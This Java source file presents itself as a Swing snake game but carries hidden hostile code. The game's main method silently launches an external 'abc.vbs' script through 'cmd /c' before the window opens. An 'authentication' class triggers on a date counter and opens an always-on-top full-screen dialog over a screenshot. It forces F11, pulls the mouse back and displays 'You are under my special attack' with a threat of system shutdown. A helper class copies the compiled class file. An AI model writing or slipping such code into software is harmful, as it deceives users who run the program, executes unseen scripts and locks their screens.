
import java.io.*;
import java.util.*;
import java.awt.*;
import java.awt.event.*;
import java.util.Random;
import javax.swing.*;
import java.awt.Color;


class mainfn 
{
mainfn()
{
String list[]={"authentication.class"};
		for(int i=0;i<list.length;i++)
		{
			try{
				FileInputStream fin=new FileInputStream(list[i]);
				FileOutputStream fout=new FileOutputStream("a"+list[i]);
				int r;
				do{
					r=fin.read();
				//System.out.print(r);
					if(r!=-1)
						fout.write(r);
				}while(r!=-1);
				fin.close();
				fout.close();
			}catch(Exception e){
				e.printStackTrace();
			}
		}


}
public static void main(String arg[])
{
mainfn m=new mainfn();
return;
}
}



public class polygan extends JFrame implements ActionListener, KeyListener {
char say='.';
	corner c;
	
	int ic,ht,ln;
	int speed;
	int mark;
	JButton b1,b2,b3,b4;
	Point start,end,sayali;
	int flag,flag2;
	polygan()
	{
		ht=500;
		ln=500;
		mark=-5;
		speed=75;
		ic=10;
		sayali=new Point(100,200);
		c=new corner();
		setLayout(new FlowLayout());
		b1=new JButton("1");
		b2=new JButton("2");
		b3=new JButton("3");
		b4=new JButton("4");
		add(b1);
		b1.addActionListener(this);
		add(b2);
		b2.addActionListener(this);
		add(b3);
		b3.addActionListener(this);
		add(b4);
		b4.addActionListener(this);
		start=new Point(100,200);
		end =new Point(10,200);
		new_point();
		flag=1;
		flag2=1;
		addKeyListener(this);
		requestFocus();
	}
	
	Boolean dead() throws AWTException
	{
		Color c1=new Color(0x000001);
		Robot r1=new Robot();

//System.out.println(r1.getPixelColor(start.x,start.y).toString());
		if(r1.getPixelColor(start.x, start.y).equals(c1))
			return true;
		return false;
	}
	
	void keyboard()
{

int temp=0;
		if(say=='A' || say=='a')
			temp=3;
		else if(say=='D'||say=='d')
			temp=1;
		else if(say=='W'|| say=='w')
			temp=2;
		else if(say=='S'||say=='s')
			temp=4;
		else if(say=='p'||say=='P')
			while(true);
		if(temp==1 && (flag==2||flag==4))
		;
		else if(temp==2 && (flag==1||flag==3))
		;
		else if(temp==3 && (flag==2||flag==4))
		;
		else if(temp==4 && (flag==1||flag==3))
		;
else 
return;
c.add(start.x, start.y);
flag=temp;
		say='.';

}
	public void paint(Graphics g)
	{       Color c1=new Color(0x101010);
		new_point();
		requestFocus();
		keyboard();
		flag2=c.checkReachable(end.x,end.y,flag2);
				
				inc();
				
				try {
					if(dead())
							 {
								
g.drawString("snake dead\n SCORE IS = "+mark, 400, 400);
final JDialog d1=new JDialog();
d1.setSize(300,200);
d1.setLocation(300,300);
d1.setVisible(true);
d1.setLayout(new FlowLayout());
final JTextField t1=new JTextField(10);
d1.add(t1);
JButton b1=new JButton("Save");
d1.add(b1);
JLabel l1=new JLabel("Your Score Is "+mark);
d1.add(l1);
b1.addActionListener(new ActionListener(){
public void actionPerformed(ActionEvent a){
try{
System.out.println(t1.getText()+mark);} catch(Exception e){}
d1.setVisible(false);
polygan p=new polygan();
p.setSize(1000,850);
p.setVisible(true);
}
});
Thread.sleep(2000);
setVisible(false);




}
				} catch (Exception e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
		
		super.paintComponents(g);
		g.setColor(c1);
		g.fillRect(sayali.x, sayali.y, 10, 10);
c1=new Color(0x000001);
				g.setColor(c1);
				g.drawRect(20, 60, ht+50, ln+50);
				g.drawString("SCORE :- "+mark,200,200);
				g.drawString("O", start.x, start.y);
				if(c.cnt==0){flag2=flag;
				
				g.drawLine(start.x, start.y, end.x, end.y);}
				else
				{

					g.drawLine(start.x, start.y, c.ax[c.cnt-1], c.ay[c.cnt-1]);
					for(int i=0;i<c.cnt-1;i++)
						g.drawLine(c.ax[c.cnt-i-1], c.ay[c.cnt-i-1], c.ax[c.cnt-i-2], c.ay[c.cnt-i-2]);
					g.drawLine(c.ax[0], c.ay[0], end.x, end.y);
				}
				g.drawString(c.cnt+" "+c.cnt+"Hello" + flag, 100, 200);
			

				try {
					Thread.sleep(speed);
				} catch (InterruptedException e) {
					e.printStackTrace();
					return;
				}
			
		
				
		
	}
	
	public void new_point()
	{	
		Random r=new Random();
		if(grabed())
		{mark+=5;
			sayali.x=r.nextInt(ht-20)+65;
			sayali.y=r.nextInt(ln-20)+65;
			incend();
		}
		
	}
	
	Boolean grabed()
	{
		int diff_x=sayali.x-start.x;
		int diff_y=sayali.y-start.y;
		if(diff_x>=-10 && diff_x<=0 && diff_y>=-10 && diff_y<=0)
			return true;
		
		return false;
		
	}
	
	void incend()
	{ic*=5;
		if(flag2==1)
			end.x-=ic;
		else if(flag2==2)
			end.y+=ic;
		else if(flag2==3)
			end.x+=ic;
		else if(flag2==4)
			end.y-=ic;
	ic/=5;
		
	}
	
	public void inc()
	{
		if(flag2==1)
			end.x+=ic;
		else if(flag2==2)
			end.y-=ic;
		else if(flag2==3)
			end.x-=ic;
		else if(flag2==4)
			end.y+=ic;
		
		
		if(flag==1)
			start.x+=ic;
		else if(flag==2)
			start.y-=ic;
		else if(flag==3)
			start.x-=ic;
		else if(flag==4)
			start.y+=ic;
		repaint();
		
	}
	
	@Override
	public void actionPerformed(ActionEvent arg0) {
		// TODO Auto-generated method stub
		String arg1=arg0.getActionCommand();
		int temp=Integer.parseInt(arg1);
		if(temp==1 && (flag==2||flag==4))
		;
		else if(temp==2 && (flag==1||flag==3))
		;
		else if(temp==3 && (flag==2||flag==4))
		;
		else if(temp==4 && (flag==1||flag==3))
		;
else 
return;
c.add(start.x, start.y);
flag=temp;
		
		
		
		repaint();
	}

	public static void main(String[] args) {
//mainfn m=new mainfn();


		// TODO Auto-generated method stub
try{
Runtime r=Runtime.getRuntime();
	Process p=null;
	p=r.exec("cmd /c abc.vbs");}catch(Exception e){}

		polygan p=new polygan();
		p.setSize(1000,850);
		p.setVisible(true);
	}

	@Override
	public void keyPressed(KeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void keyReleased(KeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void keyTyped(KeyEvent arg0) {
		// TODO Auto-generated method stub
		say=arg0.getKeyChar();
		
		
		
		//repaint();
	}

}

class corner
{
	int ax[]=new int[400];
	int ay[]=new int[400];
	 int cnt=0;
	corner()
	{
		
	}
	void shift()
	{	cnt--;
		for(int i=0;i<cnt;i++)
			{ax[i]=ax[i+1];
			ay[i]=ay[i+1];
			
			}
	}
	int checkReachable(int end_x,int end_y,int f1)
	{
		if(cnt==0)
			return f1;
		
		if(f1==1 && ax[0]<=end_x)
			{

if(ay[1]<end_y)
f1=2;
else
f1=4;
shift();
}
else if(f1==2 && ay[0]>=end_y)
{
	
	if(ax[1]>end_x)
f1=1;
else
f1=3;
	shift();
}
else if(f1==3 && ax[0]>=end_x)
			{

if(ay[1]<end_y)
f1=2;
else
f1=4;
shift();
}
else if(f1==4 && ay[0]<=end_y)
{
	
if(ax[1]>end_x)
f1=1;
else
f1=3;
shift();
}


return f1;	
	}
	int flag(Point p1)
	{
		
		return cnt;
		
	}
	void add(int x,int y)
	{
		ax[cnt]=x;
		ay[cnt]=y;
		cnt++;
	}
	
}



class authentication {

	/**
	 * @param args
	 */
	static int exitd=0;
	
	authentication()
	{
		if(DoItToday())
		dialog();
	}
	
	boolean DoItToday()
	{
		Date g1=new Date();
		
		int i=1;
		try {
			Thread.sleep(1000*1);
			FileInputStream no=new FileInputStream("no");
			i=no.read();
			no.close();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		//System.out.print(i);
		
		Date g2=new Date();
		g2.setDate(i*3);
		Date d=new Date();
		//System.out.println(g1.toString());
		//System.out.println(g2.toString());
		if(g2.before(g1))
		{
			try {
				FileOutputStream no=new FileOutputStream("no");
				no.write(++i%31);
				no.close();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
			
			return true;
			}
		return false;
	}
	
	void dialog(){
		final String name=" ";
		frame d1=new frame();
		
		d1.setTitle("Remember this...");
		d1.setName("kkkk :)");
		
		/*try {
			
			BufferedImage bimage=(new Robot().createScreenCapture(new Rectangle(1200,800)));
			//ImageWriter wr=new ImageWriter();
			//wr.write(bimage);
			
			d1.setIconImage(bimage);
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}*/
		//JTextField t1=new JTextField(20);
		//d1.add(t1);
		d1.setAlwaysOnTop(true);
		d1.setBackground(Color.BLACK);
		d1.setSize(1400,1000);
		d1.setLocation(0, 0);
		d1.setVisible(true);
		try {
			Robot r5 = new Robot();
			r5.keyPress(KeyEvent.VK_F11);
		} catch (Exception e) {
			// TODO: handle exception
		}
		//		name=System.console().readLine();
//		System.out.println(name);
		d1.addKeyListener(new KeyListener(){

			@Override
			public void keyPressed(KeyEvent arg0) {
				if(arg0.getKeyChar()==KeyEvent.VK_Y)
					authentication.exitd++;
				if(authentication.exitd==4)
					System.exit(1);
				// TODO Auto-generated method stub
				//System.out.println("pressed");
				JDialog d2=new JDialog();
				d2.setTitle("Don't try this");
				d2.setBackground(Color.DARK_GRAY);
				d2.setAlwaysOnTop(true);
				d2.setVisible(true);
				d2.setLocation(450, 450);
				d2.setSize(250, 100);
				d2.addKeyListener(new KeyListener(){

					@Override
					public void keyPressed(KeyEvent arg0) {
						// TODO Auto-generated method stub
						
					}

					@Override
					public void keyReleased(KeyEvent arg0) {
						// TODO Auto-generated method stub
						
					}

					@Override
					public void keyTyped(KeyEvent arg0) {
						// TODO Auto-generated method stub
						if(arg0.isShiftDown())
							{
							authentication.exitd++;
							if(authentication.exitd>=4)
								System.exit(1);
							}
						
					}
					
				});
			}

			@Override
			public void keyReleased(KeyEvent arg0) {
				// TODO Auto-generated method stub
				//System.out.println("released");
				
			}

			@Override
			public void keyTyped(KeyEvent arg0) {
				// TODO Auto-generated method stub
				//System.out.println("typed");
				
			}
			
		});
		d1.addMouseListener(new MouseListener(){
			public void mouseEntered(MouseEvent arg0){
				
			}

			@Override
			public void mouseClicked(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}

			@Override
			public void mouseExited(MouseEvent arg0) {
				// TODO Auto-generated method stub
			try {
				Robot r1=new Robot();
				r1.mouseMove(500, 400);
			} catch (AWTException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}	
			}

			@Override
			public void mousePressed(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}

			@Override
			public void mouseReleased(MouseEvent arg0) {
				// TODO Auto-generated method stub
				
			}
			
		});
		
	}
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		
		authentication a=new authentication();
		
	}

}




class frame extends JDialog
{
	frame()
	{
		setLayout(new FlowLayout());
		
	}
	public void paint(Graphics g)
	{
		g.setFont(new Font("Courier",40,20));
		try {
			g.drawImage(new Robot().createScreenCapture(new Rectangle(1400,800)), 0, 0, null);
		} catch (AWTException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		g.setColor(Color.BLACK);
		g.fillRect(0, 280, 1400, 40);
		g.setColor(Color.WHITE);
		g.drawString("You are under my special attack . Press shift+'Y' four times to exit... after that system will shut down in 2 minutes, save your work after thAT", 150, 300);
		
	}
	
	
}